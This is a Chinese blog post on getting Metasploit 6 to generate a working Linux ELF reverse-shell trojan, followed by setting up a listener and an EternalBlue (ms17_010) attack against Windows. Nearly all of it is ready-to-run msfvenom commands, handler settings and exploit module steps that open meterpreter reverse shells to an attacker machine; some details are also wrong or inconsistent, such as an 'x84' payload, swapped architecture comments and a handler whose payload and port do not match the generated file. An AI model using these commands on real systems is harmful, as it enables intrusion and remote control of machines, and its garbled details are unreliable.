---
layout: post
title: msf 生成 linux elf 木马反弹不成功的解决方法
categories: [安全工具]
description: docker 版本安装 msf 
keywords: 安全工具,msf
---

# 0x01 前言

## 这几天我的msf 要生成linux 的木马 一直反弹不成功，用的是以下的paylaod

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.233.131 LPORT=4444 -f elf > mshell.elf

我分析了一下报错，这个报错是没问题的，但生成的木马只有250b ，这明显是不成功的。

## 0x02 解决问题

问题1：
我刚开始认为是我msf的问题 ，回来验证了一下，我的msf 是6的版本，而这个语句是5的写法，而我启动 msfconsole ，发现我的版本是6

问题2：

设置payload，根据不同机器生成不同的；例如：x86和x64

```
linux/x64/meterpreter_reverse_tcp           # x86位机器
linux/x84/meterpreter_reverse_tcp           # x64位机器
```


**msf 6的生成语句为**

```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.3.16 LPORT=4444 -f elf > shell.elf
```
所以我改了payload ：linux/x64/meterpreter_reverse_tcp
这时候，就可以生成成功

```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.233.131 LPORT=4444 -f elf > mshell.elf
```

生成监听

```
msfconsole                                         # 在命令行里面输入命令，进入msf漏洞利用框架；
use exploit/multi/handler                          # 监听木马反弹过来的shell
set payload linux/x64/meterpreter/reverse_tcp  	   # 设置payload，不同的木马设置不同的payload，设置payload时，要根据目标系统的系统位数设置相应的payload;
set lhost 192.168.100.132                          # 我们的kali本机ip
set lport 6666                                     # 我们的kali本机端口
exploit           

```
反弹成功。


![本站favicon](https://cdn.jsdelivr.net/gh/dzxindex/picture@master/QQ%E6%88%AA%E5%9B%BE20220314191955.png)

## 利用ms17_010_eternalblue模块进行渗透：
打开msf框架：

msfconsole

使用ms17_010_eternalblue模块及各个配置：

use exploit/windows/smb/ms17_010_eternalblue

set payload windows/x64/meterpreter/reverse_tcp

show options

set rhost 目标主机IP

set lhost 监听的主机IP（在这里是docker主机的IP）

set lport 监听的端口（示例中为设置的映射的端口1234）

exploit
